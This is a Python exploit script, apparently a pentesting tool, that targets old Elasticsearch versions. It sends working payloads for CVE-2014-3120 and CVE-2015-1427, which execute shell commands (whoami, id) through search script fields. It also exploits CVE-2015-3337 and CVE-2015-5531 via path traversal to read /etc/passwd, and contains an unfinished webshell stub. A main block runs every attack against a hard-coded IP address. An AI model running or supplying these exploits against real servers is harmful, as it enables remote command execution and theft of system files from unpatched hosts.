# !/usr/bin/env python           
# coding  : utf-8 
# Date    : 2018-04-08 12:20:24
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: 

import requests
import json


class ElasticSearch:
    def __init__(self, url):
        if '://' not in url:
            url = 'http://' + url
        self.url = url.strip('/')

    def remoteCodeExec(self):
        """Version: 1.1.1
        CVE-2014-3120"""
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        req = requests.post(self.url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""")  # es 中至少存在一条数据, so, 创建
        # print(req.text)  # {"_index":"website","_type":"blog","_id":"gyLnhuVzSBGc9sN1g4v8iQ","_version":1,"created":true}
        data ={
                "size": 1,
                "query": {
                  "filtered": {
                    "query": {
                      "match_all": {
                      }
                    }
                  }
                },
                "script_fields": {
                    "command": {
                        "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                    }
                }
            }

        req = requests.post(self.url+':9200/_search?pretty', headers=headers, data=json.dumps(data))
        if req.status_code == 200:
            print('[+] ElasticSearch Remote Code Exec ~ ')

            result = json.loads(req.text)
            print(result['hits']['hits'][0]['fields']['command'])


    def remoteCodeExec2(self):
        """Version: 1.4.2
        CVE-2015-1427"""
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        req = requests.post(self.url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""")  # es 中至少存在一条数据, so, 创建

        data = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
        req = requests.post(self.url+':9200/_search?pretty', headers=headers, data=json.dumps(data))

        if req.status_code == 200:
            print('[+] ElasticSearch Remote Code Exec2 ~ ')
            print(req.text)

    def dirTraversal(self):
        """Version: < 1.4.5  or < 1.5.2
        在安装了具有“site”功能的插件以后,插件目录使用../即可向上跳转,导致目录穿越漏洞,可读取任意文件
        CVE-2015-3337"""
        req = requests.get(self.url+':9200/_plugin/head/../../../../../../../../../etc/passwd')
        if req.status_code == 200:
            print('[+] ElasticSearch Directory traversal ~ ')
            print(req.text)

    def dirTraversal2(self):
        """Version: < 1.6.1
        CVE-2015-5531"""
        data = {
            "type": "fs",
            "settings": {
                "location": "/usr/share/elasticsearch/repo/test"   # /tmp/test
            }
        }
        req = requests.put(self.url + ':9200/_snapshot/test', data=json.dumps(data))

        if 'true' in req.text and req.status_code == 200:
            print('[+] build backup success ')
            data2 = {
                "type": "fs",
                "settings": {
                    "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
                }
            }
            req2 = requests.put(self.url+':9200/_snapshot/test2', data=json.dumps(data2))
            if 'true' in req2.text and req2.status_code == 200:
                print('[+] build snapshot success ')

                req3 = requests.get(self.url+':9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd')
                if req3.status_code == 400:
                    print('[+] reading /etc/passwd ')
                    print(req3.text)

    def writeWebshell(self):
        """refer: http://cb.drops.wiki/bugs/wooyun-2015-0110216.html"""
        pass






if __name__ == '__main__':
    es = ElasticSearch(url='192.168.1.129')
    es.remoteCodeExec()
    es.remoteCodeExec2()
    es.dirTraversal()
    es.dirTraversal2()
    # es.writeWebshell()